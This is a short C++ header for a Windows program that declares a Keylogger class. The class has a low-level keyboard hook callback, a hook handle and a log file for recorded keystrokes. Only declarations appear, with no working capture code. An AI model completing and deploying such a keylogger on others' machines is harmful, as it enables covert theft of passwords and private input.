#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <string>

class Keylogger {
public:
    Keylogger(const std::string &filename);
    ~Keylogger();
    void start();

private:
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    FILE *log_file;
    HHOOK hook;
};

#endif // KEYLOGGER_H
